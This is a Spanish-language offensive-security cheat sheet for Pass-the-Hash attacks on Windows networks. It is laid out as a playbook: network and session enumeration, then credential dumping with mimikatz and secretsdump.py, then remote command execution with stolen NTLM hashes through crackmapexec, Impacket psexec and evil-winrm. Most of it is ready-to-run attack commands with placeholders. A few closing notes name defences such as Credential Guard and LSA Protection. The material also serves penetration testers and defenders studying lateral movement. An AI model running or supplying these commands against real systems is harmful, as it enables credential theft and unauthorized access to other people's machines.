**\[Pass-the-Hash]**

---

**Escenario**: Movimiento lateral o acceso remoto mediante hashes NTLM, sin necesidad de conocer la contraseña en texto claro.

**Requisitos Previos**:

* Acceso a un hash NTLM v1/v2 válido (obtenido con mimikatz, crackmapexec, responder, etc.).
* Conocimiento del nombre de usuario y dominio (si aplica).
* Conectividad de red con el objetivo (SMB, WinRM, RDP, etc.).
* Sistema remoto vulnerable (sin protecciones como Credential Guard o LSA Protection).

---

**Enumeración del Entorno**:

* Identificar sistemas Windows accesibles:

  ```bash
  nmap -p 445,139,3389,5985 <target-range>
  ```
* Determinar roles de los sistemas:

  ```bash
  crackmapexec smb <target-range> --shares
  crackmapexec smb <target-range> --sessions
  ```
* Enumerar usuarios y obtener hashes:

  ```bash
  secretsdump.py <user>:<password>@<ip>
  mimikatz: sekurlsa::logonpasswords o lsadump::sam
  ```

---

**Explotación (Pass-the-Hash)**:

* Usando `crackmapexec`:

  ```bash
  crackmapexec smb <ip> -u <user> -H <NTLM_hash>
  crackmapexec winrm <ip> -u <user> -H <NTLM_hash>
  ```

* Usando `psexec.py` (Impacket):

  ```bash
  psexec.py <domain>/<user>@<ip> -hashes :<NTLM_hash>
  ```
  ```bash
  impacket-psexec -hashes :<NTLM_hash> <domain>/<user>@<ip>
  ```

* Usando `evil-winrm`:

  ```bash
  evil-winrm -i <ip> -u <user> -H <NTLM_hash>
  ```

---

**Notas Adicionales**:

* Siempre verificar si el hash está relacionado a una cuenta local, de dominio o administradores.
* Credential Guard puede prevenir este ataque.
* Algunas configuraciones de GPO y LSA Protection también pueden bloquear el acceso remoto usando hashes.
* PTH en entorno Kerberos no aplica directamente: ver "Overpass-the-Hash".

---

**Herramientas Recomendadas**:

* Mimikatz
* Impacket (psexec.py, smbexec.py)
* CrackMapExec
* Evil-WinRM
